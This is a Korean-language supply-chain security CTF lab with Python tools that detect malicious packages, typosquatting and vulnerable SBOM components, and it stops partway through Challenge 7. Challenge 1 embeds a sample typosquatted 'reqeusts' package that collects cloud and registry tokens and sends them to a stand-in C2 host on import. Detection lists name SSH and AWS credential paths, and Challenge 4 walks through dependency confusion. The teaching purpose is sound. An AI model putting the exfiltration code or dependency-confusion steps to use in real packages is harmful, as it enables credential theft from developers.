# 공급망 보안 CTF 실습 랩

---

## 공급망 보안 기초 — 초보자를 위한 설명

### 소프트웨어 공급망이란?

소프트웨어 공급망은 하나의 앱이 만들어지기까지 사용되는 모든 구성 요소의 연쇄다. 직접 작성한 코드만이 아니라, 외부에서 가져온 라이브러리, 빌드 도구, CI/CD 파이프라인까지 포함된다.

**비유:** 식품 공급망과 같다. 마트에서 파는 빵은 밀 농장 → 제분소 → 제빵 공장 → 유통업체를 거친다. 어느 단계에서든 오염이 발생하면 최종 소비자에게 피해가 간다. 소프트웨어도 마찬가지다.

```
소프트웨어 공급망 구조

개발자 코드
    │
    ├── 오픈소스 라이브러리 (npm, PyPI, Maven...)
    │     └── 타이포스쿼팅, 의존성 혼동, 악성 패키지
    │
    ├── 빌드 시스템 (GitHub Actions, Jenkins...)
    │     └── 파이프라인 인젝션, 비밀키 노출
    │
    ├── 컨테이너 이미지 (Docker Hub, ECR...)
    │     └── 악성 베이스 이미지, 백도어 삽입
    │
    └── 배포 환경
          └── 패키지 무결성 미검증, 서명 없는 아티팩트
```

### 실제 공급망 공격 사례

| 사건 | 연도 | 공격 방법 | 피해 |
|------|------|-----------|------|
| SolarWinds | 2020 | 빌드 시스템 침투 | 18,000개 기업 영향 |
| event-stream | 2018 | npm 악성 패키지 | 비트코인 지갑 탈취 |
| ua-parser-js | 2021 | npm 계정 탈취 | 크립토마이너 배포 |
| PyPI 타이포스쿼팅 | 상시 | 유사 패키지명 | 자격증명 유출 |
| Codecov | 2021 | CI/CD 스크립트 변조 | 환경변수 탈취 |
| 3CX | 2023 | 빌드 파이프라인 | 고객 시스템 침투 |

---

## CTF 공급망 챌린지 유형

### 챌린지 유형별 접근 방법

```
유형 1: 타이포스쿼팅 탐지
  - 패키지명의 철자 오류 찾기
  - 편집 거리(Levenshtein Distance) 계산
  - 접근법: requirements.txt 전체 분석, 유명 패키지와 비교

유형 2: 악성 패키지 분석
  - 난독화된 코드 해독
  - C2 서버 URL 추출
  - 접근법: AST 분석, base64 디코딩 추적

유형 3: SBOM 취약점 발굴
  - 소프트웨어 구성 목록에서 CVE 찾기
  - 접근법: SBOM 파싱 → 버전별 CVE 매핑

유형 4: 의존성 혼동
  - 내부 패키지명을 공개 저장소에 등록
  - 접근법: 내부 패키지명 파악 → 높은 버전 번호로 등록

유형 5: 빌드 파이프라인 분석
  - CI/CD 파일에서 보안 문제 탐지
  - 접근법: .github/workflows/*.yml 분석
```

---

## 랩 개요

소프트웨어 공급망 공격을 CTF 형식으로 재현한다. 의존성 혼동, 타이포스쿼팅, 악성 패키지, 빌드 무결성 검증을 실습한다.

---

## 챌린지 1: 악성 패키지 분석

```python
#!/usr/bin/env python3
"""공급망 공격 시뮬레이션 및 분석 CTF."""

import argparse
import hashlib
import json
import base64
import ast
import sys
from pathlib import Path
from dataclasses import dataclass, field


@dataclass
class PackageAnalysis:
    name: str
    version: str
    suspicious_patterns: list[str] = field(default_factory=list)
    network_calls: list[str] = field(default_factory=list)
    file_operations: list[str] = field(default_factory=list)
    env_access: list[str] = field(default_factory=list)
    obfuscated: bool = False
    malicious_score: int = 0
    flags: list[str] = field(default_factory=list)


# 악성 패키지 예시 (타이포스쿼팅)
MALICIOUS_PACKAGE_CODE = '''
# 악성 패키지: "reqeusts" (requests 타이포스쿼팅)
import os
import sys
import socket
import urllib.request
import base64
import platform

# 합법적인 것처럼 보이는 래퍼
def get(url, **kwargs):
    """실제 requests.get을 위장."""
    _exfil()  # 악성 행위 숨김
    import urllib.request
    return urllib.request.urlopen(url)

def _exfil():
    """자격 증명 탈취 및 C2 통신."""
    env_data = dict(os.environ)
    sensitive_keys = [
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
        "GITHUB_TOKEN", "NPM_TOKEN", "PYPI_TOKEN",
        "DATABASE_URL", "API_KEY", "SECRET_KEY",
    ]
    stolen = {k: env_data.get(k, "") for k in sensitive_keys}
    
    hostname = socket.gethostname()
    payload = base64.b64encode(
        f"HOST:{hostname}|ENV:{json.dumps(stolen)}".encode()
    ).decode()
    
    # C2 서버로 데이터 전송
    try:
        c2_url = "http://malicious-c2.example.com/collect"
        urllib.request.urlopen(f"{c2_url}?d={payload}", timeout=3)
    except Exception:
        pass

# 설치 시 자동 실행 (setup.py post_install 등)
_exfil()
'''

SUSPICIOUS_PATTERNS = [
    # 난독화
    ("eval(", "eval() 사용 — 난독화 의심"),
    ("exec(", "exec() 사용 — 코드 실행"),
    ("__import__", "동적 임포트"),
    ("base64.b64decode", "Base64 디코딩 — 난독화 의심"),
    ("compile(", "동적 컴파일"),

    # 네트워크
    ("urllib.request.urlopen", "원격 URL 접근"),
    ("socket.connect", "소켓 연결"),
    ("requests.post", "HTTP POST"),
    ("subprocess.Popen", "외부 프로세스 실행"),

    # 파일 시스템
    ("open(os.path.expanduser", "홈 디렉토리 파일 접근"),
    (".ssh/", "SSH 키 접근 의심"),
    ("/.aws/", "AWS 자격 증명 접근"),
    ("/.gitconfig", "Git 설정 접근"),

    # 환경 변수
    ("os.environ", "환경 변수 접근"),
    ("AWS_ACCESS_KEY", "AWS 키 탐색"),
    ("GITHUB_TOKEN", "GitHub 토큰 탐색"),
]


def analyze_package_code(code: str, pkg_name: str, version: str) -> PackageAnalysis:
    """패키지 코드 정적 분석."""
    analysis = PackageAnalysis(name=pkg_name, version=version)

    # 의심 패턴 검색
    for pattern, description in SUSPICIOUS_PATTERNS:
        if pattern in code:
            analysis.suspicious_patterns.append(f"{pattern}: {description}")
            analysis.malicious_score += 10

    # 네트워크 호출 추출
    import re
    url_pattern = re.compile(
        r'(?:https?://|ftp://)[\w/:%#\$&\?\(\)~\.=\+\-]+'
    )
    analysis.network_calls = url_pattern.findall(code)

    # 환경 변수 접근
    env_pattern = re.compile(r'os\.environ(?:\.get)?\(["\']([^"\']+)["\']')
    analysis.env_access = env_pattern.findall(code)

    # 민감 키워드 점수
    sensitive_keywords = [
        "password", "secret", "token", "api_key", "credentials",
        "exfil", "c2", "backdoor", "steal", "harvest",
    ]
    code_lower = code.lower()
    for kw in sensitive_keywords:
        if kw in code_lower:
            analysis.malicious_score += 20

    # 플래그 결정
    if analysis.malicious_score >= 30:
        analysis.flags.append("CTF{malicious_package_detected}")
    if analysis.network_calls:
        analysis.flags.append("CTF{c2_communication_found}")
    if analysis.env_access:
        analysis.flags.append("CTF{credential_theft_detected}")

    return analysis


def check_typosquatting(package_name: str) -> list[str]:
    """타이포스쿼팅 패키지 탐지."""
    popular_packages = [
        "requests", "numpy", "pandas", "flask", "django",
        "boto3", "urllib3", "certifi", "setuptools", "pip",
        "cryptography", "paramiko", "pyyaml", "pillow",
    ]

    def levenshtein(s1: str, s2: str) -> int:
        if len(s1) < len(s2):
            return levenshtein(s2, s1)
        if not s2:
            return len(s1)
        prev = list(range(len(s2) + 1))
        for i, c1 in enumerate(s1):
            curr = [i + 1]
            for j, c2 in enumerate(s2):
                curr.append(min(
                    prev[j + 1] + 1,
                    curr[j] + 1,
                    prev[j] + (c1 != c2),
                ))
            prev = curr
        return prev[len(s2)]

    similar = []
    for pkg in popular_packages:
        dist = levenshtein(package_name.lower(), pkg.lower())
        if 0 < dist <= 2 and package_name.lower() != pkg.lower():
            similar.append(f"{pkg} (편집 거리: {dist})")
    return similar


def analyze_requirements_file(req_path: Path) -> dict:
    """requirements.txt 공급망 위험 분석."""
    results: dict = {
        "packages": [],
        "risks": [],
        "flags": [],
    }

    if not req_path.exists():
        return results

    for line in req_path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        # 패키지명 추출
        pkg = line.split("==")[0].split(">=")[0].split("<=")[0].strip()
        version = ""
        if "==" in line:
            version = line.split("==")[1].strip()

        typos = check_typosquatting(pkg)
        pkg_info = {
            "name": pkg,
            "version": version,
            "typosquatting_similar": typos,
        }
        results["packages"].append(pkg_info)

        if typos:
            results["risks"].append({
                "type": "typosquatting",
                "package": pkg,
                "similar_to": typos,
                "severity": "HIGH",
            })
            results["flags"].append("CTF{typosquatting_risk_found}")

        # 버전 없는 패키지 (재현성 위험)
        if not version:
            results["risks"].append({
                "type": "unpinned_version",
                "package": pkg,
                "severity": "MEDIUM",
            })

    return results


def check_package_hash(
    pkg_name: str, version: str, expected_hash: str, actual_file: Path
) -> dict:
    """패키지 무결성 해시 검증."""
    if not actual_file.exists():
        return {"valid": False, "error": "파일 없음"}

    actual_hash = hashlib.sha256(actual_file.read_bytes()).hexdigest()
    valid = actual_hash == expected_hash
    return {
        "valid": valid,
        "expected": expected_hash,
        "actual": actual_hash,
        "flag": "CTF{package_integrity_verified}" if valid else "CTF{tampered_package_detected}",
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="공급망 보안 CTF 랩")
    sub = parser.add_subparsers(dest="cmd", required=True)

    # 악성 패키지 분석
    analyze_p = sub.add_parser("analyze", help="패키지 코드 분석")
    analyze_p.add_argument("--code", type=Path, help="분석할 Python 파일")
    analyze_p.add_argument("--name", default="unknown", help="패키지명")
    analyze_p.add_argument("--version", default="1.0.0")

    # 타이포스쿼팅 탐지
    typo_p = sub.add_parser("typo", help="타이포스쿼팅 탐지")
    typo_p.add_argument("package_name")

    # requirements.txt 분석
    req_p = sub.add_parser("requirements", help="requirements.txt 위험 분석")
    req_p.add_argument("req_file", type=Path)

    # 시뮬레이션 데모
    sub.add_parser("demo", help="악성 패키지 분석 데모")

    args = parser.parse_args()

    if args.cmd == "analyze":
        code = args.code.read_text() if args.code else MALICIOUS_PACKAGE_CODE
        result = analyze_package_code(code, args.name, args.version)
        print(f"\n{'='*60}")
        print(f"패키지 분석: {result.name} v{result.version}")
        print(f"악성 점수: {result.malicious_score}/100")
        print(f"\n의심 패턴 ({len(result.suspicious_patterns)}개):")
        for p in result.suspicious_patterns:
            print(f"  [!] {p}")
        if result.network_calls:
            print(f"\n네트워크 호출:")
            for url in result.network_calls:
                print(f"  -> {url}")
        if result.env_access:
            print(f"\n환경 변수 접근:")
            for env in result.env_access:
                print(f"  $ {env}")
        if result.flags:
            print(f"\n[+] 획득 플래그:")
            for flag in set(result.flags):
                print(f"  {flag}")

    elif args.cmd == "typo":
        similar = check_typosquatting(args.package_name)
        if similar:
            print(f"[!] 타이포스쿼팅 위험:")
            for s in similar:
                print(f"  '{args.package_name}' -> {s}")
            print(f"\n[+] 플래그: CTF{{typosquatting_{args.package_name}}}")
        else:
            print(f"[+] '{args.package_name}' — 알려진 패키지와 유사도 없음")

    elif args.cmd == "requirements":
        result = analyze_requirements_file(args.req_file)
        print(f"분석: {args.req_file} ({len(result['packages'])}개 패키지)")
        if result["risks"]:
            print(f"\n[!] 위험 발견 ({len(result['risks'])}개):")
            for risk in result["risks"]:
                print(f"  [{risk['severity']}] {risk['type']}: {risk['package']}")
        if result["flags"]:
            print(f"\n[+] 플래그:")
            for flag in set(result["flags"]):
                print(f"  {flag}")

    elif args.cmd == "demo":
        print("[*] 악성 패키지 분석 데모: 'reqeusts' (requests 타이포스쿼팅)")
        result = analyze_package_code(
            MALICIOUS_PACKAGE_CODE, "reqeusts", "2.28.0"
        )
        print(f"\n[결과]")
        print(f"  악성 점수: {result.malicious_score}/100")
        print(f"  의심 패턴: {len(result.suspicious_patterns)}개")
        print(f"  플래그: {set(result.flags)}")


if __name__ == "__main__":
    main()
```

---

## 챌린지 2: SBOM 분석

```python
#!/usr/bin/env python3
"""SBOM (Software Bill of Materials) 취약점 분석 CTF."""

import json
import argparse
from pathlib import Path
from dataclasses import dataclass


@dataclass
class VulnerableComponent:
    name: str
    version: str
    cve: str
    cvss: float
    description: str


VULNERABLE_COMPONENTS = [
    VulnerableComponent("log4j", "2.14.0", "CVE-2021-44228", 10.0,
                        "Log4Shell — JNDI 인젝션 RCE"),
    VulnerableComponent("openssl", "1.0.2k", "CVE-2022-0778", 7.5,
                        "무한 루프 DoS"),
    VulnerableComponent("requests", "2.6.0", "CVE-2018-18074",  7.5,
                        "자격 증명 노출"),
    VulnerableComponent("django", "3.2.0", "CVE-2021-33203", 4.9,
                        "경로 순회"),
    VulnerableComponent("pillow", "8.3.1", "CVE-2021-34552", 9.8,
                        "버퍼 오버플로"),
]


def generate_sample_sbom() -> dict:
    """샘플 SBOM 생성."""
    return {
        "bomFormat": "CycloneDX",
        "specVersion": "1.4",
        "components": [
            {"name": c.name, "version": c.version, "type": "library"}
            for c in VULNERABLE_COMPONENTS
        ] + [
            {"name": "boto3", "version": "1.26.0", "type": "library"},
            {"name": "flask", "version": "2.3.0", "type": "library"},
        ]
    }


def analyze_sbom(sbom: dict) -> dict:
    """SBOM 취약점 분석."""
    findings = []
    flags = []

    for component in sbom.get("components", []):
        name = component["name"]
        version = component["version"]
        for vuln in VULNERABLE_COMPONENTS:
            if vuln.name == name and vuln.version == version:
                findings.append({
                    "component": name,
                    "version": version,
                    "cve": vuln.cve,
                    "cvss": vuln.cvss,
                    "description": vuln.description,
                })
                if vuln.cvss >= 9.0:
                    flags.append(f"CTF{{critical_vuln_{vuln.cve.replace('-','_')}}}")

    return {"findings": findings, "flags": flags}


def main() -> None:
    parser = argparse.ArgumentParser(description="SBOM 분석 CTF")
    sub = parser.add_subparsers(dest="cmd", required=True)
    sub.add_parser("generate", help="샘플 SBOM 생성")
    analyze_p = sub.add_parser("analyze", help="SBOM 분석")
    analyze_p.add_argument("sbom_file", type=Path)
    args = parser.parse_args()

    if args.cmd == "generate":
        sbom = generate_sample_sbom()
        Path("sample_sbom.json").write_text(json.dumps(sbom, indent=2))
        print("[+] sample_sbom.json 생성 완료")

    elif args.cmd == "analyze":
        sbom = json.loads(args.sbom_file.read_text())
        result = analyze_sbom(sbom)
        print(f"취약점 발견: {len(result['findings'])}개")
        for f in result["findings"]:
            print(f"  [{f['cvss']}] {f['component']} {f['version']}: {f['cve']}")
        if result["flags"]:
            print(f"\n플래그:")
            for flag in result["flags"]:
                print(f"  {flag}")


if __name__ == "__main__":
    main()
```

---

## 챌린지 3: 타이포스쿼팅 탐지 워크스루

### 단계별 풀이 가이드

타이포스쿼팅은 개발자가 패키지명을 잘못 입력했을 때 악성 패키지가 설치되도록 유도하는 공격이다.

```
실제 공격 시나리오:
  개발자 의도: import requests
  타이포 입력: pip install reqeusts  ← 'e'와 's' 순서 바뀜
  결과: 악성 패키지 설치됨!
```

**워크스루:**

```bash
# 1단계: 의심스러운 requirements.txt 확인
cat requirements.txt
# 출력:
# reqeusts==2.28.0        ← 타이포!
# numpy==1.24.0
# panads==2.0.0           ← 타이포! (pandas)
# django==4.2.0

# 2단계: 분석 도구 실행
python3 supply_chain_ctf.py requirements requirements.txt
# 출력:
# 분석: requirements.txt (4개 패키지)
# [!] 위험 발견 (2개):
#   [HIGH] typosquatting: reqeusts -> requests (편집 거리: 1)
#   [HIGH] typosquatting: panads -> pandas (편집 거리: 1)
# [+] 플래그: CTF{typosquatting_risk_found}

# 3단계: 개별 패키지 확인
python3 supply_chain_ctf.py typo reqeusts
# 출력:
# [!] 타이포스쿼팅 위험:
#   'reqeusts' -> requests (편집 거리: 1)
# [+] 플래그: CTF{typosquatting_reqeusts}

# 4단계: 악성 패키지 분석
pip download reqeusts==2.28.0 --no-deps -d ./downloaded
unzip ./downloaded/reqeusts-2.28.0.tar.gz -d ./extracted
python3 supply_chain_ctf.py analyze --code ./extracted/reqeusts/setup.py \
    --name reqeusts --version 2.28.0
```

---

## 챌린지 4: 의존성 혼동 랩 설정

### 의존성 혼동이란?

의존성 혼동(Dependency Confusion)은 내부 패키지명을 공개 저장소(PyPI, npm)에 더 높은 버전 번호로 등록하여, 자동 설치 시 악성 패키지가 설치되도록 하는 공격이다.

```
내부 시스템 구성:
  회사 내부 PyPI 서버: http://internal-pypi.company.com
  내부 패키지: company-utils==1.0.0

공격자 행동:
  공개 PyPI에 company-utils==9.9.9 등록 (악성)

pip의 동작 (버전 우선 선택):
  pip install company-utils
  → 공개 PyPI의 9.9.9 버전 우선 설치!
  → 악성 패키지 설치됨
```

### 로컬 테스트 환경 구성

```bash
# 1단계: 가상 내부 PyPI 서버 설치
pip install pypiserver

# 2단계: 내부 패키지 생성
mkdir company-utils-1.0.0
cat > company-utils-1.0.0/setup.py << 'EOF'
from setuptools import setup
setup(name="company-utils", version="1.0.0", packages=[])
EOF

python setup.py sdist
pypi-server run -p 8080 -P . -a . dist/

# 3단계: 높은 버전 악성 패키지 시뮬레이션
mkdir company-utils-evil
cat > company-utils-evil/setup.py << 'EOF'
from setuptools import setup

# setup.py의 install_requires에서 자동 실행되는 코드 시뮬레이션
import os
import socket

def exfil():
    """의존성 혼동 공격 시뮬레이션 (교육용)."""
    hostname = socket.gethostname()
    print(f"[DEMO] 의존성 혼동 공격 성공! 호스트: {hostname}")
    print(f"[DEMO] 실제 공격이라면 환경변수를 탈취했을 것입니다.")

exfil()
setup(name="company-utils", version="9.9.9", packages=[])
EOF

# 4단계: 방어책 — 버전 고정 + 해시 검증
# requirements.txt에 해시 추가
pip hash company-utils-1.0.0.tar.gz
# 출력: sha256:abc123...

# pip install with hash check
pip install company-utils==1.0.0 \
    --hash=sha256:abc123... \
    --index-url http://internal-pypi.company.com/simple/
```

---

## 챌린지 5: 악성 패키지 분석 워크스루

### 난독화된 코드 분석하기

실제 악성 패키지는 탐지를 피하기 위해 코드를 난독화한다.

```python
#!/usr/bin/env python3
"""난독화된 악성 패키지 코드 분석 도구."""

import argparse
import ast
import base64
import re
import sys
from pathlib import Path


def decode_base64_strings(code: str) -> list[dict]:
    """코드에서 Base64 인코딩된 문자열 찾아 디코딩."""
    findings = []
    # Base64 문자열 패턴 (최소 16자)
    b64_pattern = re.compile(r'["\']([A-Za-z0-9+/]{16,}={0,2})["\']')

    for match in b64_pattern.finditer(code):
        encoded = match.group(1)
        try:
            decoded = base64.b64decode(encoded).decode("utf-8", errors="ignore")
            if any(c.isprintable() for c in decoded) and len(decoded) > 5:
                findings.append({
                    "encoded": encoded[:50] + ("..." if len(encoded) > 50 else ""),
                    "decoded": decoded[:200],
                    "position": match.start(),
                })
        except Exception:
            pass

    return findings


def trace_eval_exec(code: str) -> list[dict]:
    """eval/exec 호출 추적 — 동적 코드 실행 탐지."""
    findings = []
    pattern = re.compile(r'(eval|exec)\s*\(([^)]+)\)')

    for match in pattern.finditer(code):
        func_name = match.group(1)
        argument = match.group(2).strip()

        # base64 디코딩 후 eval/exec 패턴
        if "b64decode" in argument or "decode" in argument:
            findings.append({
                "function": func_name,
                "argument": argument[:100],
                "risk": "CRITICAL — 난독화된 코드 실행",
            })
        else:
            findings.append({
                "function": func_name,
                "argument": argument[:100],
                "risk": "HIGH — 동적 코드 실행",
            })

    return findings


def extract_iocs(code: str) -> dict:
    """악성 지표(IoC) 추출 — URL, IP, 도메인."""
    iocs: dict[str, list[str]] = {
        "urls": [],
        "ips": [],
        "domains": [],
    }

    # URL 패턴
    url_pattern = re.compile(r'https?://[^\s"\'<>]+')
    iocs["urls"] = list(set(url_pattern.findall(code)))

    # IP 주소
    ip_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
    iocs["ips"] = [
        ip for ip in set(ip_pattern.findall(code))
        if not ip.startswith(("127.", "192.168.", "10.", "172."))
    ]

    # 도메인 패턴 (의심스러운)
    domain_pattern = re.compile(
        r'["\']([a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?\.(?:xyz|cc|tk|ml|ga|cf|gq|top|pw))["\']'
    )
    iocs["domains"] = list(set(m.group(1) for m in domain_pattern.finditer(code)))

    return iocs


def analyze_ast_for_dangers(code: str) -> list[str]:
    """AST 기반 위험 패턴 탐지."""
    dangers = []
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return ["코드 파싱 실패 — 문법 오류 또는 바이너리"]

    for node in ast.walk(tree):
        # 위험한 내장 함수 호출
        if isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name):
                if node.func.id in ("eval", "exec", "compile", "__import__"):
                    dangers.append(f"위험 함수 호출: {node.func.id}()")

            # subprocess 호출
            elif isinstance(node.func, ast.Attribute):
                if node.func.attr in ("Popen", "call", "run", "check_output"):
                    dangers.append(f"외부 프로세스: subprocess.{node.func.attr}()")

        # 모듈 임포트 추적
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name in ("subprocess", "socket", "ctypes"):
                    dangers.append(f"위험 모듈 임포트: {alias.name}")

    return list(set(dangers))


def main() -> None:
    parser = argparse.ArgumentParser(description="악성 패키지 코드 심층 분석")
    parser.add_argument("code_file", type=Path, help="분석할 Python 파일")
    parser.add_argument("--decode-b64", action="store_true", help="Base64 문자열 디코딩")
    parser.add_argument("--trace-eval", action="store_true", help="eval/exec 추적")
    parser.add_argument("--iocs", action="store_true", help="악성 지표 추출")
    parser.add_argument("--all", action="store_true", help="모든 분석 실행")

    args = parser.parse_args()

    if not args.code_file.exists():
        print(f"파일 없음: {args.code_file}")
        sys.exit(1)

    code = args.code_file.read_text(errors="ignore")
    print(f"\n[*] 분석 파일: {args.code_file} ({len(code)} bytes)")
    print("=" * 60)

    if args.decode_b64 or args.all:
        print("\n[Base64 디코딩]")
        findings = decode_base64_strings(code)
        if findings:
            for f in findings:
                print(f"  인코딩: {f['encoded']}")
                print(f"  디코딩: {f['decoded']}")
                print(f"  위치: 문자 {f['position']}")
                print()
        else:
            print("  Base64 문자열 없음")

    if args.trace_eval or args.all:
        print("\n[eval/exec 추적]")
        findings = trace_eval_exec(code)
        for f in findings:
            print(f"  [{f['risk']}] {f['function']}({f['argument']})")
        if not findings:
            print("  eval/exec 없음")

    if args.iocs or args.all:
        print("\n[악성 지표 (IoC)]")
        iocs = extract_iocs(code)
        if iocs["urls"]:
            print(f"  URL: {iocs['urls']}")
        if iocs["ips"]:
            print(f"  IP: {iocs['ips']}")
        if iocs["domains"]:
            print(f"  의심 도메인: {iocs['domains']}")
        if not any(iocs.values()):
            print("  IoC 없음")

    print("\n[AST 위험 패턴]")
    dangers = analyze_ast_for_dangers(code)
    for d in dangers:
        print(f"  [!] {d}")
    if not dangers:
        print("  위험 패턴 없음")


if __name__ == "__main__":
    main()
```

---

## 챌린지 6: SBOM 생성 및 분석

### SBOM이란?

SBOM(Software Bill of Materials)은 소프트웨어에 포함된 모든 구성 요소의 목록이다. 식품의 성분표와 같다.

```
SBOM 형식 비교

CycloneDX (OWASP 표준):
  - JSON/XML 형식
  - 취약점 정보 포함 가능
  - 라이선스 정보 포함

SPDX (Linux Foundation 표준):
  - ISO 5962:2021 국제 표준
  - 법적 라이선스 분석에 강점
  - SBOM 상호 운용성 높음

두 형식 모두 지원 권장
```

### Python으로 SBOM 생성하기

```python
#!/usr/bin/env python3
"""Python 프로젝트 SBOM 생성 및 취약점 분석."""

import argparse
import json
import subprocess
import sys
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path


@dataclass
class Component:
    name: str
    version: str
    purl: str  # Package URL
    license_info: str = "UNKNOWN"
    hash_sha256: str = ""


def get_installed_packages() -> list[Component]:
    """pip list로 설치된 패키지 목록 수집."""
    result = subprocess.run(
        [sys.executable, "-m", "pip", "list", "--format=json"],
        capture_output=True, text=True,
    )
    packages = json.loads(result.stdout)
    return [
        Component(
            name=pkg["name"],
            version=pkg["version"],
            purl=f"pkg:pypi/{pkg['name'].lower()}@{pkg['version']}",
        )
        for pkg in packages
    ]


def parse_requirements(req_path: Path) -> list[Component]:
    """requirements.txt에서 컴포넌트 목록 파싱."""
    components = []
    for line in req_path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("-"):
            continue
        # pip hash 형식 처리
        if ";" in line:
            line = line.split(";")[0].strip()
        name, _, version = line.partition("==")
        name = name.strip()
        version = version.strip() if version else "unknown"
        components.append(Component(
            name=name,
            version=version,
            purl=f"pkg:pypi/{name.lower()}@{version}",
        ))
    return components


def generate_cyclonedx_sbom(components: list[Component], project_name: str) -> dict:
    """CycloneDX 1.4 형식 SBOM 생성."""
    return {
        "bomFormat": "CycloneDX",
        "specVersion": "1.4",
        "version": 1,
        "metadata": {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "component": {
                "type": "application",
                "name": project_name,
            },
        },
        "components": [
            {
                "type": "library",
                "name": c.name,
                "version": c.version,
                "purl": c.purl,
                "licenses": [{"license": {"name": c.license_info}}] if c.license_info != "UNKNOWN" else [],
            }
            for c in components
        ],
    }


def check_osv_vulnerabilities(components: list[Component]) -> list[dict]:
    """OSV.dev API로 취약점 확인 (실제 API 호출 시뮬레이션)."""
    # 교육용 시뮬레이션 — 실제 구현에서는 https://api.osv.dev/v1/query 사용
    known_vulns = {
        ("requests", "2.6.0"): [{"id": "CVE-2018-18074", "severity": "HIGH"}],
        ("django", "3.2.0"): [{"id": "CVE-2021-33203", "severity": "MEDIUM"}],
        ("pillow", "8.3.1"): [{"id": "CVE-2021-34552", "severity": "CRITICAL"}],
    }

    findings = []
    for comp in components:
        key = (comp.name.lower(), comp.version)
        if key in known_vulns:
            for vuln in known_vulns[key]:
                findings.append({
                    "package": comp.name,
                    "version": comp.version,
                    "vulnerability": vuln["id"],
                    "severity": vuln["severity"],
                })
    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="SBOM 생성 및 취약점 분석")
    sub = parser.add_subparsers(dest="cmd", required=True)

    gen_p = sub.add_parser("generate", help="SBOM 생성")
    gen_p.add_argument("--project", default="my-project", help="프로젝트 이름")
    gen_p.add_argument("--requirements", type=Path, help="requirements.txt 경로")
    gen_p.add_argument("--installed", action="store_true", help="현재 환경 패키지 사용")
    gen_p.add_argument("-o", "--output", type=Path, default=Path("sbom.json"))

    vuln_p = sub.add_parser("vulncheck", help="SBOM 취약점 검사")
    vuln_p.add_argument("sbom", type=Path, help="SBOM JSON 파일")

    args = parser.parse_args()

    match args.cmd:
        case "generate":
            if args.requirements:
                components = parse_requirements(args.requirements)
            elif args.installed:
                components = get_installed_packages()
            else:
                print("--requirements 또는 --installed 옵션 필요")
                return

            sbom = generate_cyclonedx_sbom(components, args.project)
            args.output.write_text(json.dumps(sbom, indent=2, ensure_ascii=False))
            print(f"[+] SBOM 생성 완료: {args.output}")
            print(f"    컴포넌트 수: {len(components)}개")

        case "vulncheck":
            sbom_data = json.loads(args.sbom.read_text())
            components = [
                Component(
                    name=c["name"],
                    version=c["version"],
                    purl=c.get("purl", ""),
                )
                for c in sbom_data.get("components", [])
            ]
            findings = check_osv_vulnerabilities(components)
            if findings:
                print(f"[!] 취약점 발견: {len(findings)}개")
                for f in findings:
                    print(f"  [{f['severity']}] {f['package']} {f['version']}: {f['vulnerability']}")
            else:
                print("[+] 알려진 취약점 없음")


if __name__ == "__main__":
    main()
```

---

## 챌린지 7: requirements.txt 의심 패키지 스캔 도구

```python
#!/usr/bin/env python3
"""requirements.txt 공급망 보안 종합 스캐너."""

import argparse
import hashlib
import json
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path


POPULAR_PACKAGES = {
    "requests", "numpy", "pandas", "flask", "django", "boto3",
    "urllib3", "certifi", "setuptools", "pip", "cryptography",
    "paramiko", "pyyaml", "pillow", "sqlalchemy", "celery",
    "redis", "aiohttp", "httpx", "fastapi", "uvicorn",
    "pytest", "black", "mypy", "pylint", "click",
}

# 알려진 악성 패키지 블랙리스트 (예시)
KNOWN_MALICIOUS = {
    "reqeusts", "requesets", "request", "requests-",
    "urllib4", "urlib3", "numpay", "panads", "djano",
    "colourama",  # 실제 악성 패키지였음
    "python-dateutils",  # 가짜
}


@dataclass
class PackageRisk:
    name: str
    version: str
    risks: list[str] = field(default_factory=list)
    severity: str = "LOW"
    flags: list[str] = field(default_factory=list)


def levenshtein_distance(s1: str, s2: str) -> int:
    """두 문자열의 편집 거리 계산."""
    if len(s1) < len(s2):
        return levenshtein_distance(s2, s1)
    if not s2:
        return len(s1)
    prev = list(range(len(s2) + 1))
    for c1 in s1:
        curr = [prev[0] + 1]
        for j, c2 in enumerate(s2):
            curr.append(min(prev[j + 1] + 1, curr[j] + 1, prev[j] + (c1 != c2)))
        prev = curr
    return prev[len(s2)]


def check_package_risks(name: str, version: str) -> PackageRisk:
    """패키지 위험 분석."""
    risk = PackageRisk(name=name, version=version)

    # 1. 블랙리스트 확인
    if name.lower() in KNOWN_MALICIOUS:
        risk.risks.append(f"알려진 악성 패키지: {name}")
        risk.severity = "CRITICAL"
        risk.flags.append(f"CTF{{known_malicious_{name}}}")

    # 2. 타이포스쿼팅 탐지
    for popular in POPULAR_PACKAGES:
        dist = levenshtein_distance(name.lower(), popular.lower())
        if 0 < dist <= 2 and name.lower() != popular.lower():
            risk.risks.append(f"타이포스쿼팅 의심: '{name}' ≈ '{popular}' (거리:{dist})")
            if risk.severity == "LOW":
                risk.severity = "HIGH"
            risk.flags.append("CTF{typosquatting_detected}")

    # 3. 버전 미고정
    if not version or version == "*":
        risk.risks.append("버전 미고정 — 자동 업그레이드 위험")
        if risk.severity == "LOW":
            risk.severity = "MEDIUM"

    # 4. 와일드카드 버전
    if version and (">" in version or "<" in version or "~" in version):
        risk.risks.append(f"유연한 버전 제약 '{version}' — 악성 업데이트 주입 가능")
        if risk.severity == "LOW":
            risk.severity = "MEDIUM"

    # 5. 의심스러운 패키지명 패턴
    suspicious_patterns = [
        (r'-\d+$', "숫자로 끝나는 패키지명 의심"),
        (r'python-.*utils', "Generic 유틸리티 패키지 — 검증 필요"),
        (r'setup-\w+', "setup- 접두사 의심"),
    ]
    for pattern, desc in suspicious_patterns:
        if re.search(pattern, name.lower()):
            risk.risks.append(desc)
            if risk.severity == "LOW":
                risk.severity = "MEDIUM"

    return risk


def scan_requirements(req_path: Path) -> list[PackageRisk]:
    """requirements.txt 전체 스캔."""
    results = []
    for line in req_path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("-r"):
